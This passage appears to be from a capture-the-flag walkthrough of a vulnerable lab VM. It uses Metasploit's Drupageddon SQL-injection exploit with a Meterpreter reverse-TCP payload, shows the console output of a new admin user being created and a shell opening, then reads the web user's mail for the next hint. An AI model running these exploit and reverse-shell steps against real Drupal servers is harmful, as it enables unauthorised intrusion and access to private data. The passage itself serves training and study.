&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;auxiliary&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;scanner&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;drupal_views_user_enum&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2010&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;normal&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;Drupal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Views&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Module&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Enumeration&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;multi&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;drupal_drupageddon&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="mi"&gt;2014&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;excellent&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Drupal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Parameter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Key&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Value&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SQL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Injection&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;unix&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;webapp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;php_xmlrpc_eval&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="mi"&gt;2005&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;06&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;29&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;excellent&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;PHP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;XML&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;RPC&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Arbitrary&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Code&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Execution&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We set the RHOST to the VM's IP address&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf exploit(drupal_drupageddon) &amp;gt; set RHOST 10.0.2.4&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We check our options&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf exploit(drupal_drupageddon) &amp;gt; show options&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Module options (exploit/multi/http/drupal_drupageddon):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name       Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----       ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]&lt;/span&gt;
&lt;span class="code-line"&gt;  RHOST      10.0.2.4         yes       The target address&lt;/span&gt;
&lt;span class="code-line"&gt;  RPORT      80               yes       The target port&lt;/span&gt;
&lt;span class="code-line"&gt;  SSL        false            no        Negotiate SSL/TLS for outgoing connections&lt;/span&gt;
&lt;span class="code-line"&gt;  TARGETURI  /                yes       The target URI of the Drupal installation&lt;/span&gt;
&lt;span class="code-line"&gt;  VHOST                       no        HTTP server virtual host&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Payload options (php/meterpreter/reverse_tcp):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name   Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----   ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  LHOST  10.0.2.15        yes       The listen address&lt;/span&gt;
&lt;span class="code-line"&gt;  LPORT  4444             yes       The listen port&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit target:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Id  Name&lt;/span&gt;
&lt;span class="code-line"&gt;  --  ----&lt;/span&gt;
&lt;span class="code-line"&gt;  0   Drupal 7.0 - 7.31&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We launch our exploit against the server and praise for a reverse shell:
    msf exploit(drupal_drupageddon) &amp;gt; exploit&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Started&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;reverse&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.15&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Testing&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Creating&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ULMihKJWdb&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;giXrJOFefa&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Logging&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kr"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kr"&gt;as&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ULMihKJWdb&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;giXrJOFefa&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Trying&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;parse&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;enabled&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Enabling&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PHP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kr"&gt;module&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Setting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;permissions&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PHP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kr"&gt;module&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Getting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;tokens&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;article&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Calling&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;preview&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Exploit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;should&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;trigger&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Sending&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;stage&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;33721&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.4&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Meterpreter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;opened&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.15&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.4&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;52349&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mo"&gt;05&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;46&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mo"&gt;0200&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="second-hint"&gt;Second hint&lt;/h2&gt;
&lt;p&gt;Okay it works, we got a meterperter with the user &lt;code&gt;www-data&lt;/code&gt;, let's follow the
hint a get a look to the e-mails:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;meterpreter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Listing&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;==================&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Mode&lt;/span&gt;&lt;span class="w"&gt;              &lt;/span&gt;&lt;span class="n"&gt;Size&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Last&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;modified&lt;/span&gt;&lt;span class="w"&gt;              &lt;/span&gt;&lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt;              &lt;/span&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;-------------&lt;/span&gt;&lt;span class="w"&gt;              &lt;/span&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;100777&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;rwxrwxrwx&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;564&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;fil&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;04&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;01&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;0200&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let's read the e-mails of www-data:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;From&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Dave&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;dave&lt;/span&gt;&lt;span class="nv"&gt;@droopy&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;example&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Wed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Thu&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Apr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;04&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nc"&gt;Date&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Apr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;04&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;0100&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;From&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Dave&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;dave&lt;/span&gt;&lt;span class="nv"&gt;@droopy&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;example&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;Subject&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rockyou&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nice&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hat&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Message&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;ID&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;730262568&lt;/span&gt;&lt;span class="nv"&gt;@example&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;X&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;IMAP&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0080081351&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0000002016&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;Status&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;NN&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;George&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ve updated the encrypted file... You didn&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;leave&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;any&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;hints&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;me&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;The&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;isn&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;t longer than 11 characters&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;and anyway, we know what academy we went to, don&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="vm"&gt;?&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;m sure you&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;ll&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;figure&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;out&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;won&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rockyou&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;too&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;much&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;If&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;still&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;struggling&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;remember&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;that&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;song&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;by&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;The&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jam&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Later&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Dave&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
